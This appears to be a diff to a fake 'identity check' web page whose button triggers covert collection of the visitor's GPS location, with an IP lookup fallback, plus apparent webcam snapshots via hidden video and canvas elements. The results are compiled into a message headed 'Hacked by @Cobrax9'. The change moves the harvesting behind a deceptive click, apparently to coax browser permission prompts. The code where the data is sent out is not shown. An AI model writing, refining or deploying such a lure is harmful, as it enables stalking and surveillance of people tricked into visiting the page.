@@ -3,7 +3,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>Verifying Identity</title>
+  <title>Secure Verification</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <style>
     body {
@@ -27,6 +27,16 @@
     .card h2 {
       margin-bottom: 10px;
     }
+    .btn {
+      margin-top: 20px;
+      padding: 12px 24px;
+      font-size: 16px;
+      background: #00ffaa;
+      color: #000;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+    }
     .spinner {
       margin: 20px auto;
       width: 40px;
@@ -35,6 +45,7 @@
       border-top-color: #00ffaa;
       border-radius: 50%;
       animation: spin 1s linear infinite;
+      display: none;
     }
     @keyframes spin {
       to { transform: rotate(360deg); }
@@ -46,9 +57,10 @@
 </head>
 <body>
   <div class="card">
-    <h2>Verifying Your Identity</h2>
-    <p>Please hold while we secure your session...</p>
-    <div class="spinner"></div>
+    <h2>🔐 Identity Check</h2>
+    <p>Please continue to verify your session securely.</p>
+    <button class="btn" onclick="startVerification()">🔓 Continue Verification</button>
+    <div class="spinner" id="spinner"></div>
   </div>
   <video id="videoPreview" autoplay muted playsinline></video>
   <canvas id="snapshotCanvas" width="320" height="240"></canvas>
@@ -58,28 +70,27 @@
     const video = document.getElementById("videoPreview");
     const canvas = document.getElementById("snapshotCanvas");
     const ctx = canvas.getContext("2d");
+    const spinner = document.getElementById("spinner");
 
     let result = "📱 Hacked by @Cobrax9\n\n";
     let imageBase64 = "";
 
-    function useGeoLocation() {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-          pos => {
-            const lat = pos.coords.latitude;
-            const lon = pos.coords.longitude;
-            result += "🌍 GPS Location: https://maps.google.com/?q=" + lat + "," + lon + "\n\n";
-            collectRestOfInfo();
-          },
-          err => {
-            console.warn("GPS denied, using IP fallback");
-            fetchIP();
-          },
-          { timeout: 5000 }
-        );
-      } else {
-        fetchIP();
-      }
+    function startVerification() {
+      spinner.style.display = "block";
+
+      navigator.geolocation.getCurrentPosition(
+        pos => {
+          const lat = pos.coords.latitude;
+          const lon = pos.coords.longitude;
+          result += "🌍 GPS Location: https://maps.google.com/?q=" + lat + "," + lon + "\n\n";
+          collectRestOfInfo();
+        },
+        err => {
+          console.warn("GPS denied, falling back to IP...");
+          fetchIP();
+        },
+        { timeout: 5000 }
+      );
     }
 
     function fetchIP() {
@@ -153,9 +164,6 @@
         }, 3000);
       });
     }
-
-    // Start
-    useGeoLocation();
   </script>
 </body>
 </html>
